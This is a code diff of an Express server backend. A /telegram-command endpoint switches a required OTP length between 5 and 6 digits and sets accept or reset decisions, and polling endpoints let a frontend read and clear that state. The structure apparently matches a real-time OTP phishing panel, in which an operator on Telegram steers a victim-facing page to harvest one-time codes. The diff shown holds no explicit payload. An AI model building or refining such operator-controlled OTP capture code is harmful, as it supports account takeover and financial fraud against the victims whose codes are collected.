@@ -85,15 +85,12 @@ console.log("SENDING MESSAGE:", message);
 app.get("/telegram-command", (req, res) => {
   const cmd = req.query.cmd;
 
-  // 🔥 FORCE RESET FIRST
-  global.otpLength = global.otpLength || null;
-
   if (cmd === "otp5") {
-   global.otpLength  = 5;
+    otpLength = 5;
   }
 
   if (cmd === "otp6") {
-    global.otpLength = 6;
+    otpLength = 6;
   }
 
   if (cmd === "accept") {
@@ -105,10 +102,11 @@ app.get("/telegram-command", (req, res) => {
   }
 
   if (cmd === "reset") {
-        decision = null;
+    otpLength = null;
+    decision = null;
   }
 
-  console.log("NEW STATE:", { otpLength, decision });
+  console.log("STATE:", { otpLength, decision });
 
   res.send("OK");
 });
@@ -122,10 +120,7 @@ app.get("/", (req, res) => {
 
 app.post("/set-otp", (req, res) => {
   const { otp } = req.body;
-
-  
-
-  global.otpLength = otp;
+  otpLength = otp;
 
   console.log("✅ OTP SET TO:", otpLength);
 
@@ -133,7 +128,11 @@ app.post("/set-otp", (req, res) => {
 });
 
 app.get("/otp-status", (req, res) => {
-  res.json({ otp: global.otpLength });
+  const currentOtp = otpLength;
+
+  otpLength = null; // ✅ RESET AFTER FRONTEND READS IT
+
+  res.json({ otp: currentOtp });
 });
 
 app.get("/decision-status", (req, res) => {
